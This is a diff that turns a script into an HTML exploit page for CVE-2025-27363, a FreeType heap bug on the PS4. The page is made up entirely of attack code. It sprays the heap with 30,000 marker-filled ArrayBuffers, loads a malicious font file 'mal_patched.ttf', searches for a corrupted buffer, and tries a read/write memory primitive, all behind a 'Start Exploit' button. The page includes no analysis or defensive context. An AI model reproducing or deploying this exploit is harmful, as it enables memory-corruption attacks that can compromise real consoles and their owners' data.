@@ -1,65 +1,101 @@
-<script>
-const SPRAY_CNT = 30000;
-const SPRAY_SIZE = 0x100;
-const spray = [];
-let corruptedIdx = -1;
-
-function sprayHeap() {
-  for (let i = 0; i < SPRAY_CNT; i++) {
-    const buf = new ArrayBuffer(SPRAY_SIZE);
-    const f64 = new Float64Array(buf);
-    for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343;
-    spray.push({ f64, buf });
-  }
-  log("[+] Heap spray complete.");
-}
-
-function detectCorruption() {
-  for (let i = 0; i < spray.length; i++) {
-    const f64 = spray[i].f64;
-    if (f64[0] === 0x0108200700000000) {
-      log(`[!] Corrupted buffer at index ${i}`);
-      corruptedIdx = i;
-      return spray[i];
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>PS4 CVE-2025-27363 Exploit</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+      padding: 2em;
+      font-size: 18px;
     }
-  }
-  log("[-] No corruption detected.");
-  return null;
-}
+    .log { white-space: pre-wrap; margin-top: 1em; background: #111; padding: 1em; border: 1px solid #0f0; }
+    .status { font-size: 24px; margin-top: 1em; }
+    #glyph { font-size: 100px; margin-top: 1em; }
+  </style>
+</head>
+<body>
+  <h1>🧨 PS4 FreeType Heap Exploit</h1>
+  <button onclick="startExploit()">Start Exploit</button>
+  <div id="glyph">!!!!!!!</div>
+  <div class="log" id="log">Ready.</div>
+  <div class="status" id="status">Waiting...</div>
 
-function tryRWPrimitive(corrupted) {
-  log("[*] Trying R/W via corrupted buffer...");
+  <!-- 💣 INSERTED EXPLOIT CODE -->
+  <script>
+    const SPRAY_CNT = 30000;
+    const SPRAY_SIZE = 0x100;
+    const spray = [];
+    let corruptedIdx = -1;
 
-  try {
-    corrupted.f64[2] = 0x41414141;
-    let result = corrupted.f64[2];
-    log("[+] Readback: " + result.toString(16));
-  } catch (e) {
-    log("[-] R/W failed: " + e);
-  }
-}
+    function log(msg) {
+      document.getElementById("log").innerText += msg + "\n";
+    }
 
-async function loadFont() {
-  const font = new FontFace('boom', 'url("mal_patched.ttf")');
+    function sprayHeap() {
+      for (let i = 0; i < SPRAY_CNT; i++) {
+        const buf = new ArrayBuffer(SPRAY_SIZE);
+        const f64 = new Float64Array(buf);
+        for (let j = 0; j < f64.length; j++) f64[j] = 0x4343434343434343;
+        spray.push({ f64, buf });
+      }
+      log("[+] Heap spray complete.");
+    }
 
-  try {
-    await font.load();
-    document.fonts.add(font);
-    document.getElementById("glyph").style.fontFamily = 'boom';
-    log("[+] Font loaded and applied.");
-  } catch (e) {
-    log("[-] Font load failed.");
-  }
-}
+    function detectCorruption() {
+      for (let i = 0; i < spray.length; i++) {
+        const f64 = spray[i].f64;
+        if (f64[0] === 0x0108200700000000) {
+          log(`[!] Corrupted buffer at index ${i}`);
+          corruptedIdx = i;
+          return spray[i];
+        }
+      }
+      log("[-] No corruption detected.");
+      return null;
+    }
 
-async function startExploit() {
-  log("[*] Starting heap spray...");
-  sprayHeap();
-  await new Promise(r => setTimeout(r, 500));
-  await loadFont();
-  await new Promise(r => setTimeout(r, 300));
+    function tryRWPrimitive(corrupted) {
+      log("[*] Trying R/W via corrupted buffer...");
+      try {
+        corrupted.f64[2] = 0x41414141;
+        let result = corrupted.f64[2];
+        log("[+] Readback: " + result.toString(16));
+      } catch (e) {
+        log("[-] R/W failed: " + e);
+      }
+    }
 
-  const corrupted = detectCorruption();
-  if (corrupted) tryRWPrimitive(corrupted);
-}
-</script>
+    async function loadFont() {
+      const font = new FontFace('boom', 'url("mal_patched.ttf")');
+
+      try {
+        await font.load();
+        document.fonts.add(font);
+        document.getElementById("glyph").style.fontFamily = 'boom';
+        log("[+] Font loaded and applied.");
+      } catch (e) {
+        log("[-] Font load failed.");
+      }
+    }
+
+    async function startExploit() {
+      document.getElementById("status").textContent = "Running...";
+      sprayHeap();
+      await new Promise(r => setTimeout(r, 500));
+      await loadFont();
+      await new Promise(r => setTimeout(r, 300));
+
+      const corrupted = detectCorruption();
+      if (corrupted) {
+        tryRWPrimitive(corrupted);
+        document.getElementById("status").textContent = "Corruption detected! ✅";
+      } else {
+        document.getElementById("status").textContent = "No corruption ❌";
+      }
+    }
+  </script>
+</body>
+</html>
